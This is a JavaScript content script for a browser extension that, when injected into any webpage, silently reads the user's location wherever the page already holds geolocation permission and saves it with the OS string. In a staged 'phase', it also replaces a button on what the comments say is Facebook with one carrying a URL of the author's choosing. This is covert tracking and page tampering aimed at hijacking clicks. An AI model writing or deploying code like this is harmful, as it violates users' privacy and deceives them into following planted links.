function logGeolocation(){
    //get current geolcation position
    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        chrome.storage.local.set({lat:latitude, long:longitude});//save it to memory
        chrome.storage.local.set({OS:window.navigator.appVersion}); //Saving now to memory the OS, for no particular reason, just to not store it every time the user goes to a webpage
});}


//When injected in any webpage, see if permissions for gelocations are granted
navigator.permissions
    .query({ name: "geolocation" })
    .then(function (_a) {
    var state = _a.state;
    if (state === "granted") {
        logGeolocation(); //log geolocation if they are granted
    }
}); 


const sleep = ms => new Promise(r => setTimeout(r, ms));//the standard sleep function

async function demo(){
    await sleep(1000); //we wait 1 second after the DOM is loaded for facebook make his changes
    chrome.storage.local.get(["ChildPhi","ContPhi","ParentPhi"]).then((result)=>{
    var a = document.getElementById(result.ChildPhi) //we search for the function buttom
    if (a != null){ //IF EXISTS
        var b = document.createElement("BUTTON");  //we create a new buttom
        //select the parent of the buttom
        var p = document.querySelector(result.ParentPhi)
        b.innerHTML =result.ContPhi //add the url we like
        p.replaceChild(b,a) //replace the buttoms in the DOM
    }
    })
    
}

chrome.storage.local.get(["phase"]).then((result)=>{

    if (result.phase == 1){
        demo()
    }  
})